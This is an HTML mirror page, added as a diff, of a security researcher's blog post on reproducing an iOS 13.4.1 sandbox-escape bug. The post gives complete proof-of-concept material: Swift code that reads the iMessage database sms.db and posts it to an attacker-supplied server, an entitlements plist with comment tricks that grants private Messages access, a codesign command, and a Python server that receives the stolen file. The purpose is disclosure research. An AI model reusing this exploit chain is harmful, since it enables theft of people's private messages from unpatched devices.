@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>
+Stealing your SMS messages with iOS 0day - linksfor.dev(s)    </title>
+    <meta charset="utf-8">
+    <link rel="alternate" type="application/rss+xml" title="Linksfor.dev(s) feed" href="https://linksfor.dev/feed.rss" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="google" value="notranslate">
+    <link rel="stylesheet" type="text/css" href="/style.css" />
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+    <meta property="og:title" content="Stealing your SMS messages with iOS 0day - linksfor.dev(s)"/>
+    <meta property="article:author" content="Wojciech Regu&#x142;a"/>
+    <meta property="og:description" content="This is a special post because I fully based on another researcher, s1guza&amp;rsquo;s 0day. All of this story began from the following tweet:&#xA;Siguza told us that his 0day was patched in the iOS 13.5 beta3. So this is actually a sandbox escape 0day for the newest, non-beta iOS version (13.4.1). In this post, I&amp;rsquo;ll show you how I reproduced that bug and wrote a malicious application that uses that 0day to steal the iMessage history!"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:url" content="https://wojciechregula.blog/post/stealing-your-sms-messages-with-ios-0day/"/>
+
+<meta property="og:site_name" content="linksfor.dev(s)" />
+</head>
+<body>
+    <div class="devring" style="background: #222">
+        <div style="text-align:center">Explore other dev related sites in this ring. If you would like to join this ring <a href="https://devring.club">click here</a>.</div>
+        <div class="grid">
+            <div style="display: grid; grid-template-columns: .5fr 1fr 1fr 1fr; text-align: center;">
+                <span class="devring-title"><a href="https://devring.club/">devring.club</a></span>
+                <a href="https://devring.club/sites/1/prev" class="devring-previous">Previous</a>
+                <a href="https://devring.club/random" class="devring-random">Random</a>
+                <a href="https://devring.club/sites/1/next" class="devring-next">Next</a>
+            </div>
+        </div>
+    </div>
+    <div class="grid">
+        <h1>
+<a href="/" style="color:inherit">linksfor.dev(s)</a>
+        </h1>
+        <title>linksfor.dev(s) - Stealing your SMS messages with iOS 0day</title>
+<div class="readable">
+        <h1>Stealing your SMS messages with iOS 0day</h1>
+            <div>by Wojciech Regu&#x142;a</div>
+            <div>Reading time: 4-5 minutes</div>
+        <div>Posted here: 05 May 2020</div>
+        <p><a href="https://wojciechregula.blog/post/stealing-your-sms-messages-with-ios-0day/">https://wojciechregula.blog/post/stealing-your-sms-messages-with-ios-0day/</a></p>
+        <hr/>
+<div id="readability-page-1" class="page"><section><article><p>This is a special post because I fully based on another researcher, <a href="https://twitter.com/s1guza">s1guza’s</a> 0day. All of this story began from the following <a href="https://twitter.com/s1guza/status/1255641164885131268">tweet</a>:</p><p><img src="https://wojciechregula.blog/images/2020/05/tweet.png" alt="0day tweet"></p><p>Siguza told us that his 0day was patched in the iOS 13.5 beta3. So this is actually a sandbox escape 0day for the newest, non-beta iOS version (13.4.1). In this post, I’ll show you how I reproduced that bug and wrote a malicious application that uses that 0day to steal the iMessage history! 😱</p><p>I won’t explain this bug in detail, as S1guza plans to make an article about it. <del>I’ll update this post when he does.</del> UPDATE: <a href="https://siguza.github.io/psychicpaper/">https://siguza.github.io/psychicpaper/</a></p><h3 id="the-plan">The plan</h3><ol><li>Create an application that loads the <code>sms.db</code> file and sends to our server</li><li>Sign the application with malicious entitlements (with the 0day)</li><li>Install the app on the device</li><li>Turn on the receiving server</li><li>Open the database!</li></ol><h3 id="exploitation">Exploitation</h3><p>I created a simple Swift app that contains the following code:</p><div><pre><code data-lang="swift"><span>import</span> <span>SwiftUI</span>
+
+<span>struct</span> <span>ContentView</span>: View {
+    
+    @State <span>var</span> serverURLString: String = <span>""</span>
+    
+    <span>var</span> body: some View {
+        
+        VStack() {
+            Text(<span>"""
+</span><span>                iMessage DB stealing PoC</span><span>
+</span><span>
+</span><span>                based on @s1guza's tweet</span><span>
+</span><span>
+</span><span>                coded by @_r3ggi
+</span><span>                """</span>).multilineTextAlignment(.center)
+        
+            TextField(<span>"Server URL"</span>, text: <span>$</span>serverURLString).padding(.all, <span>40</span>).textFieldStyle(RoundedBorderTextFieldStyle())
+            
+            Button(action: {
+                sendPostData(serverURLString: <span>self</span>.serverURLString)
+            }) {
+                Text(<span>"Send your sms.db!"</span>)
+            }
+        }
+    }
+}
+
+
+<span>func</span> <span>sendPostData</span>(serverURLString: String) {
+    <span>let</span> messagesPath = <span>"/private/var/mobile/Library/SMS/sms.db"</span>
+    <span>let</span> messagesURL = URL(fileURLWithPath: messagesPath)
+    <span>let</span> serverURL = URL(string: serverURLString)
+    <span>var</span> request = URLRequest(url: serverURL<span>!</span>)
+    request.httpMethod = <span>"POST"</span>
+    
+    <span>do</span> {
+        <span>if</span> FileManager.<span>init</span>().isReadableFile(atPath: messagesPath) {
+            <span>let</span> rawMessagesDB = <span>try</span> Data(contentsOf: messagesURL)
+            request.httpBody = rawMessagesDB
+        } <span>else</span> {
+            request.httpBody = <span>"Nope"</span>.data(using: .utf8)
+        }
+    } <span>catch</span> {}
+    
+    <span>let</span> task = URLSession.shared.dataTask(with: request) { (data, response, error) <span>in</span>
+            <span>if</span> <span>let</span> error = error {
+                print(<span>"Error took place </span><span>(</span>error<span>)</span><span>"</span>)
+                <span>return</span>
+            }
+    }
+    task.resume()
+}</code></pre></div><p>Then I compiled the app and created the following entitlements file:</p><div><pre><code data-lang="xml"><span>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span>&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span>
+<span>&lt;plist</span> <span>version=</span><span>"1.0"</span><span>&gt;</span>
+<span>&lt;dict&gt;</span>
+    <span>&lt;key&gt;</span>application-identifier<span>&lt;/key&gt;</span>
+    <span>&lt;string&gt;</span>[redacted].blog.wojciechregula.SandboxEscape<span>&lt;/string&gt;</span>
+<span>&lt;!---&gt;&lt;!--&gt;</span>
+<span>&lt;key&gt;</span>platform-application<span>&lt;/key&gt;</span>
+<span>&lt;true/&gt;</span>
+<span>&lt;key&gt;</span>com.apple.private.security.no-container<span>&lt;/key&gt;</span>
+<span>&lt;true/&gt;</span>
+<span>&lt;key&gt;</span>com.apple.private.security.storage.Messages<span>&lt;/key&gt;</span>
+<span>&lt;true/&gt;</span>
+<span>&lt;!-- --&gt;</span>
+<span>&lt;/dict&gt;</span>
+<span>&lt;/plist&gt;</span></code></pre></div><p>I signed the compiled app:</p><div><pre><code data-lang="sh">codesign -d --entitlements entitlements.xml SandboxEscape.app -f -s <span>"Apple Development: wojciechregula.blog [redacted]"</span></code></pre></div><p>Next stage was to install the application on the device:</p><p><img src="https://wojciechregula.blog/images/2020/05/XCode.png" alt="0day tweet"></p><p>After that, I opened my Python server:</p><div><pre><code data-lang="python"><span>from</span> http.server <span>import</span> HTTPServer, BaseHTTPRequestHandler
+
+<span>class</span> <span>SimpleHTTPRequestHandler</span>(BaseHTTPRequestHandler):
+
+    <span>def</span> <span>do_GET</span>(self):
+        self<span>.</span>send_response(<span>200</span>)
+        self<span>.</span>end_headers()
+        self<span>.</span>wfile<span>.</span>write(<span>b</span><span>'Hello, world!'</span>)
+
+    <span>def</span> <span>do_POST</span>(self):
+        <span>print</span>(<span>"RECEIVING!!!"</span>)
+        content_length <span>=</span> int(self<span>.</span>headers[<span>'Content-Length'</span>])
+        body <span>=</span> self<span>.</span>rfile<span>.</span>read(content_length)
+        <span>with</span> open(<span>"./sms.db"</span>, <span>"wb"</span>) <span>as</span> f:
+            f<span>.</span>write(body)
+
+
+httpd <span>=</span> HTTPServer((<span>'192.168.0.14'</span>, <span>8888</span>), SimpleHTTPRequestHandler)
+httpd<span>.</span>serve_forever()</code></pre></div><p>I opened the application:</p><p><img src="https://wojciechregula.blog/images/2020/05/PoC.png" alt="0day tweet"></p><p>Then, I provided my server’s URL, clicked the button and… 🤯! All my messages from my iPhone with the newest non-beta iOS were sent to the server:</p><p><img src="https://wojciechregula.blog/images/2020/05/db.png" alt="0day tweet"></p><h3 id="what-can-i-do">What can I do?</h3><p>Wait for the iOS 13.5. Do not install any suspicious apps before Apple releases the update!</p></article></section></div></div>
+    </div>
+    <footer>
+        <div>created by buildstarted &copy; 2020 <a href="/about">about</a></div>
+        <div>Share this page on social media: copy and paste this url https://linksfor.dev/</div>
+        <div>If you prefer RSS: <a href="https://linksfor.dev/feed.xml">https://linksfor.dev/feed.xml</a></div>
+        <div>Customer satisfaction guaranteed to be optional.</div>
+    </footer>
+    
+    <script async defer>
+        _dna = window._dna || {};
+        _dna.siteId = "linksfor.devs";
+        _dna.outlink = true;
+
+        (function() {
+            let dna = document.createElement('script');
+            dna.type = 'text/javascript';
+            dna.async = true;
+            dna.src = '//dna.buildstarted.com/t.js';
+            let s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(dna, s);
+        })();
+    </script>
+    <noscript><img src="//dna.buildstarted.com/g?siteId=linksfor.devs"/></noscript>
+</body>
+</html>
